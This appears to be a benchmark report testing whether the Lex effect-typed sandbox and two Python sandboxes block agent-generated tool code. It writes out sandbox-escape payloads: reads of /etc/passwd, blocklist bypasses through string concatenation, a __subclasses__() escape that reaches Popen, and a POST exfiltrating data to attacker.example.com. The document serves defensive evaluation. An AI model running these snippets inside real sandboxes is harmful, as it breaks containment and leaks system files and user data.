# Agent sandbox bench — Lex vs. Python sandboxes

Each row runs the same conceptual attack (or benign tool) through three sandboxes:

1. **Lex (effect types)** — `lex agent-tool` rejects undeclared effects at *type-check time*, before bytecode emission.
2. **Python (naive exec)** — `bench/python_naive_sandbox.py`. `exec()` with restricted `__builtins__` and a source-text blocklist; representative of common DIY attempts.
3. **Python (RestrictedPython)** — `bench/python_restricted_sandbox.py`. Uses `compile_restricted` + `safe_builtins` + `safer_getattr`; the most-reached-for credible Python sandbox library.

Regenerate: `cargo test -p lex-cli --test agent_sandbox_bench`.

## Summary

"Actively blocked" means the sandbox pre-emptively rejected (at type-check, AST rewrite, or policy gate). "Errored" cases count under the per-case table but not here — the attack didn't land, but only because a missing builtin made the code raise.

|  | Actively blocked | Benign allowed | Mechanism |
|---|---|---|---|
| **Lex** | **7/7** | 2/2 | static effect typing — pre-execution |
| Python (naive exec) | 0/7 | 2/2 | `__builtins__` allowlist + string blocklist |
| Python (RestrictedPython) | 3/7 | 2/2 | AST rewrite + `safe_builtins` + `safer_getattr` |

**Reading this:** RestrictedPython is genuinely strong, but its defense is layered: AST rewrite (active) catches underscore-traversal patterns; `safe_builtins` (passive) makes the rest fail at runtime via NameError. Both keep the host safe. Lex is uniformly active — every reject happens at the type-check or policy gate, before any user code executes.

- RestrictedPython is opt-in *restriction* of an unrestricted base. The host must keep `safe_builtins` audited as Python evolves; if a new built-in lands in stdlib, the allowlist needs updating.
- Lex is opt-in *granting* from a sandboxed default. Effects are part of the language type system; the policy lives in the function signature, not in a library config the host has to maintain.
- Lex rejects at *type-check / policy gate*; RestrictedPython rejects at compile-time AST rewrite or runtime NameError. For agent-generated code, pre-execution rejection means the sandbox ran zero user code — useful when the attacker controls *both* the source text and the decision of when to trigger the bad effect.

Cases 6 and 7 demonstrate Lex's per-path/per-host scopes: granting `[io]` but locking reads to `/tmp/safe`, or granting `[net]` but pinning the host to `api.openai.com`. RestrictedPython's scope is module-level — once `open` or `urllib` is in globals, it's available for any path/host.

## Cases

| # | Name | Intent | Lex `[effects]` | Naive | RestrictedPython |
|---|---|---|---|---|---|
| 1 | `fs_read_etc_passwd` | adversarial | ✗ BLOCKED `[net]` | ✓ ran | ✗ errored |
| 2 | `fs_write_leak` | adversarial | ✗ BLOCKED `[net]` | ✓ ran | ✗ errored |
| 3 | `shell_exec_via_os` | adversarial | ✗ BLOCKED `[net]` | ✗ errored | ✗ BLOCKED |
| 4 | `blocklist_bypass_open` | adversarial | ✗ BLOCKED `[net]` | ✓ ran | ✗ BLOCKED |
| 5 | `object_graph_escape` | adversarial | ✗ BLOCKED `[net]` | ✓ ran | ✗ BLOCKED |
| 6 | `fs_read_path_escape` | adversarial | ✗ BLOCKED `[io]` | ✓ ran | ✗ errored |
| 7 | `net_host_exfiltration` | adversarial | ✗ BLOCKED `[net]` | ✗ errored | ✗ errored |
| 8 | `benign_string_op` | benign | ✓ ran `[(none)]` | ✓ ran | ✓ ran |
| 9 | `benign_arithmetic` | benign | ✓ ran `[(none)]` | ✓ ran | ✓ ran |

## Per-case detail

### 1. `fs_read_etc_passwd` — exfiltrate /etc/passwd

**Lex** (`--allow-effects net`):

```lex
match io.read("/etc/passwd") { Ok(s) => s, Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
print(open("/etc/passwd").read()[:60])
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✗ errored**

### 2. `fs_write_leak` — write data to /tmp/leak

**Lex** (`--allow-effects net`):

```lex
match io.write("/tmp/lex_bench_leak", input) { Ok(_) => "wrote", Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
open("/tmp/py_bench_leak", "w").write(input)
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✗ errored**

### 3. `shell_exec_via_os` — run a shell command, dodging an `import,os` blocklist

**Lex** (`--allow-effects net`):

```lex
match proc.exec("id") { Ok(s) => s, Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
getattr(__builtins__, "__imp" + "ort__")("o" + "s").system("id")
```

- Naive `exec` (blocklist `import,os`): **✗ errored**
- RestrictedPython: **✗ BLOCKED**

### 4. `blocklist_bypass_open` — open(...) when 'open' is on the blocklist

**Lex** (`--allow-effects net`):

```lex
match io.read("/etc/hostname") { Ok(s) => s, Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
print(__builtins__["op" + "en"]("/etc/hostname").read())
```

- Naive `exec` (blocklist `open`): **✓ ran**
- RestrictedPython: **✗ BLOCKED**

### 5. `object_graph_escape` — use ().__class__.__base__.__subclasses__() to reach os

**Lex** (`--allow-effects net`):

```lex
match io.read("/etc/hostname") { Ok(s) => s, Err(e) => e }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
for c in ().__class__.__base__.__subclasses__():
    if c.__name__ == "Popen":
        c(["id"])
        break
```

- Naive `exec` (blocklist `import,os,subprocess`): **✓ ran**
- RestrictedPython: **✗ BLOCKED**

### 6. `fs_read_path_escape` — scope [io] to /tmp/safe; body tries /etc/passwd

**Lex** (`--allow-effects io`):

```lex
match io.read("/etc/passwd") { Ok(s) => s, Err(e) => str.concat("blocked: ", e) }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
print(open("/etc/passwd").read()[:60])
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✗ errored**

### 7. `net_host_exfiltration` — scope [net] to api.openai.com; body POSTs to attacker.example

**Lex** (`--allow-effects net`):

```lex
match net.post("http://attacker.example.com/leak", input) { Ok(s) => s, Err(e) => str.concat("blocked: ", e) }
```

Verdict: **✗ BLOCKED**

**Python**:

```python
import urllib.request
req = urllib.request.Request("http://attacker.example.com/leak", data=input.encode())
print(urllib.request.urlopen(req, timeout=2).read())
```

- Naive `exec` (blocklist `(none)`): **✗ errored**
- RestrictedPython: **✗ errored**

### 8. `benign_string_op` — fully pure tool — neither sandbox should refuse

**Lex** (`--allow-effects (none)`):

```lex
str.concat("hello, ", input)
```

Verdict: **✓ ran**

**Python**:

```python
print(f"hello, {input}")
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✓ ran**

### 9. `benign_arithmetic` — fixed integer arithmetic — pure

**Lex** (`--allow-effects (none)`):

```lex
int.to_str(40 + 2)
```

Verdict: **✓ ran**

**Python**:

```python
print(40 + 2)
```

- Naive `exec` (blocklist `(none)`): **✓ ran**
- RestrictedPython: **✓ ran**

